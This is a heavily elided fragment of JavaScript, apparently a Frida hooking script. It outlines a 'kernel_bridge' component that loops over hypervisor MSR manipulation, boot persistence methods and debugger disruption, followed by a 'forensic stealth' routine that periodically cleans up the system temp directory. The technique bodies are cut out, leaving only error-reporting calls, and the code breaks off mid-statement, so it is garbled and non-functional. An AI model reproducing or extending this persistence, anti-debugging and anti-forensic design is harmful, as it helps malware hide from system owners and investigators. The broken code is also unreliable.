                ...
                hypervisorMSRs.forEach(msrInfo => {
                    try {
                        ...
                        send({
                            type: 'debug',
                            target: 'kernel_bridge',
                            action: 'msr_manipulation_failed',
                        });
                    }
                });
                ...
                persistenceMethods.forEach(method => {
                    try {
                        ...
                        send({
                            type: 'debug',
                            target: 'kernel_bridge',
                            action: 'boot_persistence_failed',
                        });
                    }
                });
                ...
                debuggerDisruptionMethods.forEach(method => {
                    try {
                        ...
                        send({
                            type: 'debug',
                            target: 'kernel_bridge',
                            action: 'debugger_disruption_failed',
                        });
                    }
                });
            ...
            this.setupForensicStealth = () => {
                ...
                this.setupContinuousArtifactCleanup = () => {
                    const cleanupInterval = setInterval(() => {
                        try {
                            const tempPath =
                                Process.platform === 'windows' ? 'C:\\Windows\\Temp' : '/tmp';
                            send({
